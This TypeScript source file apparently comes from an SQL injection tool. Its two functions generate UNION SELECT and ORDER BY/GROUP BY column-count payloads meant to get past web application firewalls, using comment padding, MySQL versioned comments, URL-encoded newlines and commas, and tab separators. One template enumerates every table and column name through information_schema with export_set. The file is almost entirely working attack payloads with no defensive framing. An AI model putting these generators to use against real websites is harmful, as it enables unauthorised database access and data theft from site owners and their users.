/**
 * Generates custom column strings for WAF-Bypass Union Statement templates
 * based on user-specified column count N using comment delimiters and bypass syntax.
 */
export function generateWafUnionColumns(templateId: string, count: number): string {
  const n = Math.max(1, Math.min(count, 500)); // safe bounds between 1 and 500

  switch (templateId) {
    case 'waf-union-comment-select': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION/**/SELECT/**/${cols}`;
    }
    case 'waf-union-version-comment-select': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `/*!50000UNION*//**//*!50000SELECT*/${cols}`;
    }
    case 'waf-union-all-comment-select': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION/**/ALL/**/SELECT/**/${cols}`;
    }
    case 'waf-union-all-version-comment-select': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `/*!50000UNION*//*!50000ALL*//*!50000SELECT*/${cols}`;
    }
    case 'waf-union-select-parens': {
      const cols = Array.from({ length: n }, (_, i) => `(${i + 1})`).join(',');
      return `UNION(SELECT${cols})`;
    }
    case 'waf-union-null-comment': {
      const cols = Array.from({ length: n }, () => 'null').join(',');
      return `UNION/**/SELECT/**/${cols}`;
    }
    case 'waf-union-comment-newline': {
      const cols = Array.from({ length: n }, (_, i) => `${i + 1}/**/%0A`).join(',');
      return `UNION/**/SELECT/**/${cols}`;
    }
    case 'waf-union-encoded-comma': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join('%2c');
      return `UNION/**/SELECT/**/${cols}`;
    }
    case 'waf-union-version-parens': {
      const cols = Array.from({ length: n }, (_, i) => `/*!50000(${i + 1})*/`).join(',');
      return `/*!50000UNION*//**//*!50000SELECT*/${cols}`;
    }
    case 'waf-union-tab-separated': {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION\tSELECT\t${cols}`;
    }
    default: {
      const cols = Array.from({ length: n }, (_, i) => i + 1).join(',');
      return `UNION/**/SELECT/**/${cols}`;
    }
  }
}

/**
 * Generates custom column strings for WAF-Bypass Column Count templates
 * based on user-specified column count N using comments and bypass techniques.
 */
export function generateWafOrderColumns(templateId: string, count: number): string {
  const n = Math.max(1, Math.min(count, 500)); // safe bounds between 1 and 500

  switch (templateId) {
    case 'waf-col-count-order-by-comment':
      return `ORDER/**/BY/**/${n}`;
    case 'waf-col-count-version-order-by':
      return `/*!50000ORDER*//**/BY/**/${n}`;
    case 'waf-col-count-order-by-newline':
      return `%0aORDER%0aBY%0a${n}`;
    case 'waf-col-count-group-by-comment':
      return `GROUP/**/BY/**/${n}`;
    case 'waf-col-count-version-group-by':
      return `/*!50000GROUP*//**/BY/**/${n}`;
    case 'waf-col-count-group-by-newline':
      return `%0aGROUP%0aBY%0a${n}`;
    case 'waf-col-count-union-null': {
      const nulls = Array.from({ length: n }, () => 'NULL').join(',');
      return `/*!50000UNION*//**//*!50000SELECT*//**/${nulls}`;
    }
    case 'waf-col-count-into-vars': {
      const vars = Array.from({ length: n }, (_, i) => `@v${i + 1}`).join(',');
      return `LIMIT/**/1/**/INTO/**/${vars}`;
    }
    case 'waf-col-count-select-export-set':
      return `'+AND+(/*!50000SELECT*/*/**/FROM/**/(Select+export_set(${n},@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))=(SELECT 1)--+`;
    default:
      return `ORDER/**/BY/**/${n}`;
  }
}

